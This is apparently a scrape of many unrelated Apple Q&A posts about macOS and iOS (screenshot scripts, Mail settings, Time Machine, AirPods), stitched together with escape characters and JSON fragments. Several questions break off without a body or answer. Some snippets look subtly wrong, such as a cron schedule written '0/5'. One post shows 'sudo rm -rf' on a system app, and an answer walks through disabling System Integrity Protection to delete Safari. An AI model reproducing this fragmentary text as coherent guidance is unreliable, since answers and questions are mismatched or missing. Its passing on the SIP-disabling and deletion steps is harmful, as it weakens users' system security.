I have a simple project to capture screenshots every several seconds and save them to a folder.\nI found this helpful script on GitHub:\n\n\n*\n\n*https://gist.github.com/jonobr1/a91c166a94a65e64c9b7\nI've altered it a bit in an attempt to change the file name to this format:\nscreen_shot 2019-04-05 at 5.23.13 PM.jpg\nYet, I end up with a filename like this:\nscreen_shot0Thursday\nI could use some help sorting out how to properly use the date and time functions within the script.\nHere is the script:\nset dFolder to \"~/Desktop/screencapture/\"\nset theDate to current date\n\ndo shell script (\"mkdir -p \" & dFolder)\n\nset i to 0\nrepeat 960 times\n    do shell script (\"screencapture \" & dFolder & \"screenshot_\" & i & theDate & \".jpg\")\n    delay 5 -- Wait for 5 seconds.\n    set i to i + 1\nend repeat\n\n\nA: If you really want to do everything in AppleScript, then you should try:\nto date_format(old_date) -- Old_date is text, not a date.\n    set {year:y, month:m, day:d} to date old_date\n    tell (y * 10000 + m * 100 + d) as string to text 1 thru 4 & \"-\" & text 5 thru 6 & \"-\" & text 7 thru 8\nend date_format\n\nto time_format(old_time)\n    set {hours:h, minutes:m, seconds:s} to date old_time\n    set pre to \"AM\"\n    if (h > 12) then\n        set h to (h - 12)\n        set pre to \"PM\"\n    end if\n    return (h & \".\" & m & \".\" & s & \" \" & pre) as string\nend time_format\n\nset theDate to (current date)\nset dateFormatted to date_format(date string of (theDate))\nset timeFormatted to time_format(time string of (theDate))\nset filename to  \"screen_shot \" & dateFormatted & \" at \" & timeFormatted & \".jpg\"\n\nNote: With regards to AM/PM: I haven't tried this in the evening, but it should work\nIt would be way easier, however to use do shell script for this, e.g.:\nset formattedDate to (do shell script \"date +'%Y-%m-%d at %H.%M.%S %p'\")\nset filename to \"screen_shot \" & formattedDate & \".jpg\"\n\nor even in one step by using: \ndo shell script \"screencapture \\\"/Users/yourusername/Desktop/screencapture/screen_shot $(date +'%Y-%m-%d at %H.%M.%S %p').jpg\\\" \"\n\nMake sure to replace username with your actual username, and also that the folder screencapture exists.

I've setup my email account with Mail.app. However, I cannot send mail. \nThe reason for this is that whenever I try to send mail, Mail.app always selects a legacy SMTP server, which I used to have configured, instead of whichever one it selects. \nIt gets to the point where if the dialogue for selecting an SMTP server comes up, and I select a different one, it'll still use the legacy one. When I click \"Edit SMTP server list\" I can change the list, however, the very next time I open that list, all my changes are discarded, and the legacy server is back. \nHow do I nuke Mail.app?\n\nA: You could check if macos is trying to manage your connection settings automatically. That is controlled from inside the preferences for the Mail.app, under Accounts, and under Server Connections, at the bottom of the page. If the checkbox \"Automatically manage connection settings\" is checked, then macos will try to manage these settings for you. There's more information about what it does and how to disable it here: https://support.apple.com/en-us/HT204208 \nIf that does not help, you could also remove that account completely. However this is a more drastic operation. In System Preferences (not in the Mail.app), there is a preference pane for Internet Accounts. Try removing your email account and then readding it. There's a tutorial here that explains how: http://osxdaily.com/2016/04/04/delete-email-account-from-mac/\n\nA: I know it's a long time now that this question has been asked, but I did experience the same problem. \nI solved it by removing a file located in my preferences folder, that is : \n~/Library/Preferences/com.apple.mail.plist.lockfile\nOnce I removed this file (after quitting Mail.app), the STMP server choice was \"sticky\" again.\n", "Q: How to type a long/em dash `—` When writing emails and articles I often find myself in the need to use a long/em dash — character, not to be confused with the hyphen - character. Normally what I end up doing is I type two consecutive hyphens -- and hit the Space key, which then ends up replacing the two hyphens with the long dash.\nHowever, when posting articles in browser-based editors this doesn't always work — such as with the post editor here — so I have to type the double hyphen + Space elsewhere, like in a dummy email, copy the long dash from there and paste it here. This is very inconvenient of course.\nI'd like a shortcut to enter the long dash character directly.\n\nA: This might be one of those that changes by language, but on a UK English keyboard [& from comments, also US English], there are 4 dashes available from the key to the right of 0, Minus.\n-  -  key alone (hyphen)\n–  -   Opt ⌥  (en dash)\n—  -   Opt ⌥   Shift ⇧  (em dash)\n_  -   Shift ⇧  (underscore) \nLate Edit...\nTo complete the set, & from comments...\n Ctrl ⌃   Opt ⌥   -  will give 'information separator one' which looks like a space \"\" & doesn't even seem to print in here.

I am wondering if it is possible to ensure that no apps are updated using Mobile Data by accident. For example, I just updated all my apps because I didn't notice I wasn't on Wi-Fi.\nIs it possible to turn on some sort of alert or notification?\n\nA: There is no such mechanism of displaying an alert or notification when attempt is made to update apps over Mobile Data. (If you think about it, such a mechanism won't make any sense, as you may or may not notice the notification/alert when update is attempted over Mobile Data).\nYour best bet is to turn off Mobile Data for automatic downloads. Go to Settings app → iTunes & App Stores and turn off the switch for Use Mobile Data.\n\nYou can also choose to turn off Automatic Downloads of Updates, but that setting will apply to both Wi-Fi and Mobile Data.\nAlternatively, you can turn on Low Power Mode by going to Settings app → Battery → Low Power Mode. This will turn off automatic downloading of Music, Apps and Updates. An active Low Power Mode is indicated by orange colour battery indicator in Status bar.\n\nThe unintended side effect of this approach would be that it will also turn off automatic download of updates over Wi-Fi.\nLastly, the best approach in my personal opinion would be to turn off Mobile Data for App Store app by going to Settings app → Mobile Data. This way there wouldn't be any intended or unintended downloads via App Store over Mobile Data. Also, this way you would be reminded when browsing the App Store, that you are not currently on Wi-Fi, even if you accidentally try to download or update an app.\n\n", "Q: Connect through Finder with server, save permissions?

Here's what I've done so far:\n1) Created two Shortcuts, one to enable, and another to disable Cellular Data.\n2) Added these two Shortcuts to Siri.\nDoing these two steps have enabled me to ask Siri on my Apple Watch to enable/disable Cellular Data on the iPhone.\nBut, I want to execute these Shortcuts without Siri. Is it possible to add a link to a Shortcut on the Apple Watch Home screen? I know that's possible on the iPhone, but haven't found a way to do it on the Apple Watch.\n\nA: Unfortunately, this is not currently possible.

The following is a real-world example - I'm not an iOS developer, so I am trying to understand how this can be possible:\n\n\n*\n\n*Create a new, test Google account and when done, create a test Apple ID.\n\n*Set up an iOS device, and at the stage where you are asked to enter the details to log into an Apple ID, choose to skip this for now.\n\n*When taken to Springboard, launch the App Store, and search for \"Assistant\". Tap the \"Get\" button, at which time you will be asked to log into the iTunes Store. Do this by entering the details for the just-created Apple ID, at which point the app will begin to download. Note that we have in no way logged into iCloud, and that we have just logged into the iTunes store for the purpose of downloading the app.\n\n*When the app has finished downloading, launch it and when asked to sign in, enter the details for the new Google account (created in step 1). You should now be signed into the Assistant app.\n\n*Go back to the Home screen, and remove the Assistant app; confirm when prompted so that it will be removed from the device.\n\n*Now, go back to the App Store, and search for \"Gmail\". Choose to download this - you shouldn't be prompted to log into an Apple ID, because iOS has saved the details when Assistant was downloaded.\n\n*Launch the app, and tap the \"Sign In\" button. Notice that the previously-entered Google account is listed - this will match the one used to sign into Assistant. Tapping on this account will allow you to access Gmail with those details, without being prompted to enter a password of any kind whatsoever.\nFor me, the most interesting aspect of this is that even after the Assistant app is removed, the details for the Google account entered into the app before being uninstalled are still remembered. I haven't been able to figure out how this is done; it can't be iCloud (because it wasn't enabled at the time of the initial installation of Assistant). Does anybody know how it's possible that even after an app is uninstalled, another app is able to read data previously written to memory by a separate app?\n\nA: The login information is securely store in the iOS keychain subsystem. Unlike macOS, keychain in iOS is not user accessible. However, apps can programmatically store and query for data in keychain.\nGoogle developed apps look for pre-existing user information in the iOS keychain when installed. The login information is not removed from the device unless you choose to remove the account from your device from within one of the installed app.\niOS keychain provides a secure cryptographic disk store which is locked when the device is locked and unlocked when the device is unlocked. An app can access only its own keychain items, or those shared with a group to which the app belongs. Apps from the same developer, such as Google in this case, fall under same group (via common Bundle Identifier component) and this lets them share a secret via keychain.\n", "Q: Dictionary shows wrong language (British English instead of American English) Under macOS 10.14.4, I've enabled the following dictionaries:\n\nYet, when I hid ⌃⌘D, I get the results as follows:\n\nI would expect the results to show only American English dictionaries, and not British English. \n\nA: This seems to be a bug that appears when you're switching languages.

Most descriptions of Launchd describe it is mostly doing nothing as described in this article titled: What Is launchd, and Why Is It Running on My Mac?:\n\nIt’s very rare for launchd to take up many system resources, and when\n  it does happen, rebooting your Mac is usually enough to fix it.\n  Occasionally a buggy program trying to launch faulty daemons can cause\n  launchd to use up a bunch of CPU.

I see several posts about editing the .app's plist, but it looks like that trick stopped working after 10.8.\nHow can I prevent this icon from showing up in, and getting pinned to the dock in macOS 10.14?\n\nA: \nHow can I prevent this icon from showing up in, and getting pinned to the dock in macOS 10.14?\n\nYou can't. \nYour Mac is under MDM policies and thusly you can't override what those policies are.\nThe setting \"Keep in dock\" has no effect on a separate process that checks to see if an item is in a dock and manually putting it back.  Think of it as you, the user, removing an item, then coming back and manually putting the icon back to the dock; that setting would have no effect there either.\n\nThere is an option to disable the dock icon in the utility config, but\n  its effects are org-wide and they won't disable it.\n\nThis statement confirms this.  The MDM software/process has the ability to insert the dock icon per its configuration, but, as you stated, your IT organization doesn't want to disable it.

Once on the official Apple website it was written to keep iPhone's charge between 20% and 80% for better battery life.\nI've not found exact battery specs for the AirPods (I am about 2nd gen), probably they have the same battery type as latest iPhones (Li-ion).\nSo, do I have to keep AirPods with at least 20%+ charge while using? I can't keep them 20%-80% because of case will charge them even they are at 99% battery.\n\nA: \n... do I have to keep AirPods with at least 20%+ charge while using?\n\nNo.  Use the AirPods for what you purchased them for - wireless headphone with Siri control.\nLithium ion batteries don't need to be micro-managed like previous generation batteries needed to. They don't develop a memory and will function (generally) for their usable life.\nThe key to this is to understand that age and cycle count is, by far, the largest factor in determining battery health.  You can mitigate factors that will diminish battery life like avoiding extreme temperatures and physical trauma but there's no procedure or practice you can do that will extend the life of the battery.\n\nI can't keep them 20%-80% because of case will charge them even they are at 99% battery.\n\nThis is also not an issue and a misunderstanding of how charging works.   Batteries and chargers are \"smart\" in that they will automatically reduce/stop charging when it reaches a full charge.  Batteries naturally discharge without use, and the charger will kick back in recharging the battery.\nThe good news is Apple has official battery service options now and some third party companies are also competing in the battery repair service space.\n\n*\n\n*https://9to5mac.com/2021/02/09/what-to-do-with-old-dying-airpods/\n\nA: What Allan said is pretty spot on. To make things more clear, lithium ion batteries do best when the charge is around 50%. In order of most to least importance:\n\n\n*\n\n*Don't let the battery get to 0. Deep discharge cycles are extremely damaging for the battery. If you do let it get to 0, make sure you charge it at the next possible opportunity, because the longer the charge is at 0 the deeper the discharge (due to \"phantom drain\" and other things).\n\n*Don't charge to 100%. (Side note: 100% is arbitrarily defined, but usually 4.2V). As with empty batteries, try to keep the time it's at 100% to a minimum. \n\n*Keep battery between 10% and 90%, or 20% and 80%, or 25% and 75%. But we're getting into diminishing returns territory. The lifespan of the battery (if you follow all of the above) is going to be hundreds of cycles even with bad batteries, thousands of cycles with good ones.\nTo summarize: look at how much you're usually using them. If you use about 50% of the battery try to keep them between 25% and 75%, if you use 80% try to stay between 15% and 95%. \n", "Q: Automate arranging files into folders based on beginning of file name? Looking to quickly arrange a whole load (talking about multiple thousands) of files into subfolders, and the files come in sets of three (left audio, right audio, video) separate files.

Here we can see the state of the directory where the *.mxf files resides after running the script:\n$ tree\n.\n├── 0015\n│   ├── 0015.mxf\n│   ├── 0015_A01.mxf\n│   └── 0015_A02.mxf\n├── 0016\n│   ├── 0016.mxf\n│   ├── 0016_A01.mxf\n│   └── 0016_A02.mxf\n├── 0017\n│   ├── 0017.mxf\n│   ├── 0017_A01.mxf\n│   └── 0017_A02.mxf\n├── 0018\n│   ├── 0018.mxf\n│   ├── 0018_A01.mxf\n│   └── 0018_A02.mxf\n└── mover.sh\n\n4 directories, 13 files\n\nHow does it work\nThe script makes use of a UNIX tool called find to produce a list of files that match the pattern *.mxf. This list is then iterated through and a series of commands are run on each filename found:\n\n\n*\n\n*file=\"${1/\\.\\//}\" - takes each filename and removes a ./ that is prefixed to each name by find\n\n*echo \"$file\" - display the results of this command to the screen\n\n*dir=${file/[_.]*mxf/} - remove any trailing characters that match the patterns _*.mxf or *.mxf\n\n*[ -d \"$dir\" ] || mkdir -p $dir - check if the directory the files goes into exists, if it doesn't make it\n\n*mv $file $dir/. - move this file into the corresponding directory\n\n\nRunning this periodically\nOne idea here would be to setup a cronjob that runs periodically on macOS to run this script. You can read more about how to accomplish this here in this tutorial titled: Schedule jobs with crontab on Mac OS X.\nThe basic steps here are as follows:\n\n\n*\n\n*Create a crontab entry\n$ env EDITOR=nano crontab -e\n\n\n*Add a entry specifying what script to run and when (every 5 mins)\n0/5 * * * *  cd ~/my/mxf/folder && ./mover.sh\n\n\n*Confirm your changes\n$ crontab -l\n\n\nA: As of Mac OS 10.14.4 I have not been able to find such function but you can hold command (windows key if using a windows keyboard) then click with two fingers on trackpad or left click and say \"New Folder with Selection\".\n", "Q: Mac Mojave, how to remove Safari How do I remove Safari from my Mac, OS 10.14.3?  Is this at all possible?\nI have tried to drag it to the trash bin and it does say Safari is required by the OS but I wondered whether there was a way round this at all.\nI've also tried sudo rm -rf Safari.app/ but it says operation not permitted\n\nA: The correct answer in this case is \"Don't do that; you're asking for trouble.\" Safari is heavily integrated into the OS. Removing/disabling Safari is bound to eventually get you into a situation where an API malfunctions and you'll drive the poor person trying to help you insane.\nI dare ask why you would want to remove Safari given that there is no advantage in doing so. You can remove IE from Windows or bash from a Linux distro, but the 26 MB you'll save won't be worth the anguish of having macOS eat its tail at some point down the road.\n\nA: On macOS, there are restrictions for root user to prevent crashing your Mac integrity and stability. Removing Safari is risky and useless, that’s why macOS prevents that. Not to mention you don't really save much disk space doing this.\nYou need to disable System Integrity Protection (SIP). Do this with csrutil disable command. You can only use it in macOS recovery mode using Terminal. \nDo that by rebooting your Mac with Command+R keys held down. there will be a utilities menu, select Terminal and type that command in. When it is done reboot normally.\nDo not forget to re-enable SIP with csrutil enable again in macOS recovery mode once you have deleted the safari.app.\n", "Q: How to temporarily disable the Finder application? I am trying to incorporate the use of CLI commands in my daily workflow to learn them better. I have tried the seemingly popular solution of force-quitting Finder from the Apple menu, but it isn't very difficult to relaunch it by simply clicking on Trash or a folder on the Desktop. I am unsure as to what extent Finder manages macOS operations, but is there a way to disable it that makes it harder to relaunch?\nSystem: MacBook Air (13-inch, Early 2014), running macOS Mohave 10.14.4\nWhile I can decide to religiously refrain from using Finder, I have noticed that making things harder to reach is the fool-proof way to curb the muscle memory that has developed over time, just as the best way to start learning hard things is to reduce friction and make them more accessible.\nI wish to make it so that the command line is my only way to get around, and if there's a way to force this without much damage I'd be happy to give it a shot :)\n\nA: You should move away from force-quitting Finder. \nUse graceful quitting:\n    defaults write com.apple.finder QuitMenuItem -bool YES\n    killall Finder\n\nYou now have a regular \"Quit\" command, not in the Apple menu but in the Finder application menu with corresponding keyboard shortcut cmd+q.\nThis makes the Desktop clutter disappear and Finder won't launch if clicking on the backround picture or the Trash.\nThis is a nice and easy option, and it should be enough!\nBonus: if you do this for 'enforcing more CLI usage/skills', then that means more keyboard centric activities? ➞ Turn on Dock hiding (System Preferences ➞ Dock ➞ Automatically hide and show the Dock). Then use cmd+Tab  to switch between active applications. This further minimises chances for a 'mis-click' on the Finder icon that would cause an unwanted relaunch.\nFor the case presented as is in the question the above is quick & easy and a non-running Finder is reversed easily with one single click of the mouse (or for those wanting to improve their CLI skill with a open -a Findercommand in Terminal…)\n", "Q: Time machine backup hangs I do backups of Mac OS High Sierra 10.13.6 with Time Machine to USB external HDD's and at some point I couldn't wait for any backup to complete.\nFor example it can be like this for maybe over 6 hours, until I just press \"Skip This Backup\" \n\nIf I check sudo fs_usage backupd, it's just lots of these lines\n09:55:49.515864    RdMeta[ST3]     D=0x3e5fe8a8  B=0x2000   /dev/disk3s1                                                                                              0.016663 W backupd.824910\n09:55:49.533957    RdMeta[ST3]     D=0x3cafd768  B=0x2000   /dev/disk3s1                                                                                              0.018043 W backupd.824910\n09:55:49.565517    RdMeta[ST3]     D=0x3af3e360  B=0x2000   /dev/disk3s1                                                                                              0.031517 W backupd.824910\n09:55:49.575010    RdMeta[ST3]     D=0x2c4e29b8  B=0x2000   /dev/disk3s1                                                                                              0.009424 W backupd.824910\n09:55:49.591100    RdMeta[ST3]     D=0x399f9a78  B=0x2000   /dev/disk3s1                                                                                              0.016015 W backupd.824910\n09:55:49.610730    RdMeta[ST3]     D=0x399a8458  B=0x2000   /dev/disk3s1                                                                                              0.019583 W backupd.824910\n09:55:49.634997    RdMeta[ST3]     D=0x366a0e50  B=0x2000   /dev/disk3s1                                                                                              0.024226 W backupd.824910\n09:55:49.675542    RdMeta[ST3]     D=0x2fd33260  B=0x2000   /dev/disk3s1                                                                                              0.040490 W backupd.824910\n09:55:49.696395    RdMeta[ST3]     D=0x2d39c3d0  B=0x2000   /dev/disk3s1                                                                                              0.020778 W backupd.824910\n09:55:49.704406    RdMeta[ST3]     D=0x2c560448  B=0x2000   /dev/disk3s1                                                                                              0.007943 W backupd.824910\n09:55:49.722183    RdMeta[ST3]     D=0x2a9fa720  B=0x2000   /dev/disk3s1                                                                                              0.017714 W backupd.824910\n09:55:49.752376    RdMeta[ST3]     D=0x00847a20  B=0x2000   /dev/disk3s1                                                                                              0.030050 W backupd.824910\n09:55:49.794376    RdMeta[ST3]     D=0x417a1b50  B=0x2000   /dev/disk3s1                                                                                              0.041950 W backupd.824910\n\noccasionally interrupted by \n09:55:42.201947  getattrlistbulk                                                                                                                                      7.885756   backupd.824910\n\nUPD:\ntmutil listbackups doesn't show any .inProgress entries, so deleting them couldn't work for me\nMy current backup session is frozen on 919.2Mb. tmutil status output is:\nBackup session status:\n{\n    BackupPhase = Copying;\n    ClientID = \"com.apple.backupd\";\n    DateOfStateChange = \"2019-04-13 21:47:32 +0000\";\n    DestinationID = \"80DD4AE0-6BD5-4E91-9A67-2C3346B95A68\";\n    DestinationMountPoint = \"/Volumes/yellow backups\";\n    Percent = \"0.01760709905511998\";\n    Progress =     {\n        TimeRemaining = 143771;\n        \"_raw_totalBytes\" = 46987386344;\n        bytes = 919235073;\n        files = 548346;\n        totalBytes = 51686124978;\n        totalFiles = 1048225;\n    };\n    Running = 1;\n    Stopping = 0;\n    \"_raw_Percent\" = \"0.01956344339457776\";\n}\n\nThe output doesn't seem to update over time\nUPD2: after approx 18 hours of hangup, backup has completed and now it's on Cleaning up... phase.\nI'm still wondering what's causing this behavior and if I can somehow avoid it.\n\nA: In my case, I confirmed the drive was working fine and could easily do almost 100MB/s, yet backups were happening in KB /s.  I had backups going back 4 years and it seems it is the layering of backups that slowed things down.\nA few possible solutions:\n\n\n*\n\n*Many users report that booting into \"Safe mode\" will reset some data and then restarting back into \"Normal mode\" may solve such issues.\n\n*Try to repair the external disk using \"Disk Utility\" (may take a very long time).\n\n*Can try updating the drive firmware.\n\n*If you have enough space on the external drive, partition it into 2 separate disks. (May also take a day or so)\n\n\n*\n\n*Then setup Time Machine to use the new partition. This will require a complete \"Initial\" backup, but in my case, 300GB initial backup was still faster than the 4GB incrimental backup on the old drive.\n\n\n*As a final resort, wipe the drive and backup from scratch or buy a new drive to use in parallel.\nI'm still experimenting, but there may be a bug causing Time Machine to slow down significantly as new backups are added. I'm using an HFS+j external USB3 drive from WD. Hope that helps.\n\nA: As discussed in this answer, try deleting the .inProgress file of the current backup, using\nsudo tmutil delete /path/to/backup.inProgress\n\n", "Q: Permission for drive I've installed Windows beside macOS. My MacBook now has two drives.  \n\n\n*\n\n*Drive \"A\" and Drive \"B\".  \n\n*Drive \"A\" has macOS boot and Drive \"B\" Windows 7.\n\n\nThe problem now is that I can't modify drive A when I'm working with Windows 7. I have to log out from there, boot to macOS and then do the changes like cut, delete etc folders or files. \nIs there any solution that would solve this problem (preferably without formatting the drive)?\n\nA: When Macs were first able to run Windows 7 (SP1), the Boot Camp Support Software installed the software necessary to allow reading of Mac OS Extended (Journaled) volumes from Windows. Also, OS X (macOS) could read from Windows NTFS volumes.  Neither Apple nor Microsoft provided a way to allow writing to the other operating system's volumes.\n\nUnfortunately, as Apple has progresses toward the new APFS format, some (if not all) Windows Boot Camp installations have loss the ability to read from macOS volumes. \n\nA possible solution would be to purchase a third party product such as the Mac ToolBox from Paragon Software. \nAnother possible solution would be to create another separate FAT32 or ExFAT formatted drive. You could  then use the drive for storage of files used by both operating systems or to transfer files between operating systems.\nFinally, if you have a high speed internet connection, then you could copy small files to your iCloud drive and access the files from both macOS and Windows. \n", "Q: What is identityservicesd? *Just a preface I do not have anything noticeably wrong with my computer (MacBook Pro (Retina, 15-inch, Mid 2015), Mojave 10.14.4), and I was learning as I went along.\nIn the process of cleaning out my computer I noticed a key in my login keychain just named <key>. \n\n\nThe only information listed is identityservicesd.app\nWhat can be found on Google, StackExchange, StackOverflow, Apple Support Forums, Reddit and blogs about identityserviced: \n\n\n*\n\n*Macinside.info - identityservicesd is a background process (Identity Services Daemon) that deals with third-party credentials. \n\n*People complaining of bugging, performance issues, login errors, repetitive prompts requesting system access, security concerns.\n\n*Recommending solutions to fix these problems (if you have these problems, more or less everyone is recommended to follow these steps)\n\n*No other information about the process.\n\n\nMy questions are:\n\n\n*\n\n*What is identityservicesd?\n\n*Why is it that it's credentials in my keychain just named <key>?\n\n\nEven if this is a background benign process, it does seem to act in a strange way when it does have to interact with the user.

All current methods of distribution, including those available through the ordinary App Store developer program and the Enterprise Developer program, have expiration dates.\nAnother answer mention Enterprise distribution as the solution - but it is not. The provisioning profile expires after 1 year, and the certificate itself after 3 years.

I got a brand new 1 TB SSD fitted and am trying to restore from Time Machine, now.  The restore can see the Time Machine drive no problem, but when it goes forward to choose a destination disk, there is no disk indicated.\nSo I restart the restore process, and this time go into disk utility.  What's strange is that I can see the Samsung SSD, but also the original Macintosh HD.  I know that it's not there, as I have it sitting next to me (and besides.. can Minis have more than one internal drive?).  \nSo I guess what I need to do is to remove the \"ghost\" disk from Disk Utility and then prepare the SSD as \"Macintosh HD\" to accept my restore.\nCan someone tell me how I do this? \n\nA: The problem you are experiencing is because you only replaced the 1TB spinning portion of the Fusion drive; the 128GB SSD is still there with the boot partition on it.\nYou've confirmed this when you said that you can see both the Samsung SSD and the original HD.  What you need to do now is wipe both and create a new Fusion drive to combine the 128GB SSD and the 1TB SSD into one CoreStorage volume.\nI've detailed these steps in this post on how to do this.  Since you've got everything backed up with Time Machine and are using it for recovery, you should have no problems migrating your data over.\n", "Q: Can I share Ethernet internet connection through Thunderbolt cable?

Clicking it does nothing similar to Apple Menu.\nWhat I tried:\n\n\n*\n\n*I checked the Console application for logs (nothing relevant in there)\n\n*I checked /var/log/system.log, I checked /var/log/shutdown_monitor.log (nothing relevant in there)\n\n*SMC reset\n\n*NVRAM reset\n\n*Created new fresh user, to see if it's a problem with my user account (the issue persists)\n\n*I disabled all the login items and bunch of startup services (java updates, and bunch of similar non-system stuff)\n\n\nA: This looks suspiciously like a problem with permissions. Open /Applications/Utilities/Disk Utility and fix permissions on your drive then reboot and see if it works.\nEDIT: After comment, repair permissions is not available anymore in newer macos releases. \nThen you will have to reinstall macos, I am afraid. \n\nA: Try a NVRAM reset as others have pointed out. If that doesn't do it you almost definitely need a reinstall of OS X. \nRestart your mac and hold cmd + R until you see the Apple logo and use ‘Install OS X ___’. This could take a few hours but none of your files/accounts will be erased - it just replaces the System folder which is where all the mechanics for that stuff is at.\n", "Q: Force FileVault to use 256-bit key encryption Is there a way to use 256-bit key encryption for macOS system?\nI’ve tried formatting system partition myself with bigger key size APFS, but macOS installer actually reverted this as it asks for user password now on login screen, not “disk password” on boot.\n\nA: Most documentation I'm finding seems to indicate that the key's used in macOS 10.9 and higher use a 256 bit key by default.\n\nEncryption and authentication support\nFileVault 2 uses the Advanced\n  Encryption Standard (AES) encryption algorithm, which delivers robust\n  protection for stored data. Until mid-2013, it only supported the use\n  of 128-bit keys, not 256-bit keys. Although 128-bit keys are\n  technically acceptable in many environments, organizations are rapidly\n  moving toward 256-bit keys to thwart emerging threats.\nThe latest versions of Mac OS X, starting with 10.9, support 256-bit\n  AES keys, so organizations wishing to enable FileVault 2 on legacy\n  systems should be cautious about the 128-bit key strength present in\n  older Mac OS X versions, Lion (10.7) and Mountain Lion (10.8).\n\nReference: Apple FileVault 2: Full disk encryption software overview\nThis PDF and the Wikipedia page seem to indicate this as well.\n\n\n*\n\n*macOS Security - Overview for IT 2018\n\n*Wikipedia - FileVault\n", "Q: When trying to update existing free apps or install new ones, I get into a payment \"Verification Required\" loop On my iPad (iOS 12.2), I'm trying to update my existing apps.

After clicking \"Done\", it pops up the Apple ID authentication box again, which brings me back to the payment method screen, and this loop continues forever. I can't update my apps or install any new apps, even free ones.\nIn my App Store settings, I have disabled the \"Require Password for Free Downloads\" setting, but it doesn't make a difference.

Which means, each time you change anything and save the file, the image looses in quality.\nPhotos and your iDevice usually avoid this by adding all edits as a separate file and leaving the original untouched. However, third party software would not understand this additional information (especially as it's an internal format and can change with any update of Photos or iOS). So Photos reverts to the old fashioned approach to avoid image quality losses with every edit: saving the file (with all the edits you did on the phone or in Photos) in a lossless format, TIFF. This can be edited as much as you like, and will not deteriorate each time you save it. At the cost of being more bulky.\nOnce you are finished editing, I suggest making a JPEG or HEIC copy and keeping the TIFF file only on your backup disk or such.\n", "Q: Set sshd to serve different shell based on `host` I want my local sshd to serve different shell, based on the host.\nExample:\n\n\n*\n\n*ssh user@hostname1 -> get's bash\n\n*ssh user@hostname2 -> get's fish\nIs it possible, and if so, how can it be done?\n\nA: I'm not able to find a way to accomplish what you're asking for directly with sshd and the options available in man sshd_config or man sshd.\nMethod #1 via ssh client\nThe first method that comes to mind is pretty straightforward.

My big concern is not losing my Time Machine backups.\n\nA: Okay, I figured out what was going on: When macOS detects a drive being unplugged without being ejected (which I don't think happened but I did get a message saying it had), the next time you plug the drive in fsck is going to go to work automatically, to check out the drive and attempt to repair it if need be. Unless you go looking, you'll get no indication that this is what's happening other than that the drive (or a partition on it) won't mount. This super helpful comment was key to my understanding what's going on: https://superuser.com/a/1013435/955941. After about 10 hours, fsck finished and the partition mounted correctly.\n", "Q: How do I get Boot Camp back as default startup volume? I used to have Boot Camp as my default startup volume. \nI have updated to 10.14.4 recently and since then Boot Camp is no longer shown under start volumes.

This prevents the Boot Camp partition to be used as a startup volume. If you deactivate the NTFS driver in NTFS for Mac, it can be used as startup volume again. \n", "Q: keep installer applications up to date I have a folder with apps to deploy. But I would like these to be up to date. Anyone have any idea how to keep these applications up to date? \nI can't use the MAS (mac app store?) because they are applications to deploy and not my applications. I use imagr to deploy my macOS images and it will look for the applications it needs to install in a folder and install them. (vscode and firefox do not exist in the mac app store...). \n\nA: It‘s a rather broad question because the specific method depends on the applications in question.

Hi I'm new to Macs and OSX, I'm using p7zip cli app to compress folders with big files inside (1; 2 GB or more). So I managed to make a Bash script to do it in batch process when I go to bed and I'm not using the computer. \nThis the code:\n#!/bin/bash\n for folder in */\n do\n 7z a -t7z -m0=lzma2 -mx=9 -mfb=64 -md=1024m -ms=on -mmt2 \"${folder%/}.7z\" \"$folder\"\n done\n\nI have this in Comp7zip.sh file, I put that file inside the main folder that contains all the other subfolders I want to compress. So from the terminal I do: \n$cd myfolder\n$./Comp7zip.sh\n\nThen in the terminal I can see how the 7z app is working, and it compresses all the folders just fine.\nBut since it is a bit annoying, copying the .sh file inside the folder and using the terminal every time, I use Automator to create a service and do it with a couple of clicks, this is the code:\n#!/bin/bash\ncd \"$@\"\nfor folder in */\ndo /usr/local/bin/7z a -t7z -m0=lzma2 -mx=9 -mfb=64 -md=1024m -ms=on -mmt2 \"${folder%/}.7z\" \"$folder\"\ndone\n\nIt's almost the same, just add the cd \"$@\" to use the selected folder in finder, so I have a new service that does the same thing that the .sh file does.\nI just select the folder that has all the subfolders I want to compress, then pick my service from Finder's context menu, works fine and compresses all the folders inside the selected folder.\nThe problem here is, that in this way I can't see the 7z app wile it's working, all the compressing is made in the background with just and icon of a little gear in the menu bar that indicate the compress is running, and nothing more. \nSo with little files this is not a problem the compress ends fast, but with large files, I can't see how the compress work is doing it.\nSo the question is, how can I make Automator to show me the running task in the same way the method with the .sh Bash file does?\nAlso any ideas of how to add to this process a way to compress files outside subfolders in the selected folder? I mean all this code only works with folders and it's content, but not with files, so how cam I make it work with folders and files in the same process?\nI'm sorry for my grammar, English is not my native language.\n\nA: If you run a shell script by:\n\n\n*\n\n*Opening the Terminal application\n\n*Telling the Terminal application to start your script\n\n\nThen the script's output will, by default, be displayed inside the Terminal window (this can be changed by, for example, redirecting the output to a text file with the > character). This is what you have been doing \"before going to bed\".\nShell scripts, however, can also be run without ever opening the Terminal application! For example, you could create a launchd plist to run a shell script whenever your computer finishes booting. In this case, the script would run, but nothing would be displayed on screen, because the Terminal application was never opened.\nSimilarly, Applescript's do shell script command executes shell code directly without ever opening the Terminal.\nInstead of running the shell code directly, tell the Terminal application to run the shell code for you:\ntell application \"Terminal\"\n  do script \"echo 'Hello World'\"\nend tell\n\nNow, Applescript will open a Terminal window, and run your shell code inside of it.\n\n", "Q: Does the AirPods case need to be around while listening via an iOS Device? When using an iOS device with a set of AirPods that have previously been paired, is the case also required whilst wearing them or can the buds be used without it?\n\nA: No you don’t need the case to continue listening!\n\nThe case is only used for charging/storage and the initial (one time) pairing with your devices.\nYou can leave the case at home and get full usage out of the AirPods until the battery dies. This includes switching devices, monitoring battery levels, using Find My AirPods, etc.\nI typically take the case with me unless I’m going for a quick jog/walk. I don’t recommend storing the AirPods anywhere other than the case or in your ears, to avoid losing them. Obviously the charging case prolongs the overall battery life as well.\n\nA: Once you have paired the AirPods to an iOS device, you don't the case anymore to reconnect it to the device. The box helps in switching automatically to the nearby device and charging the AirPods.\n", "Q: Can I create fonts drawn as outlined in Word 16 for Mac?

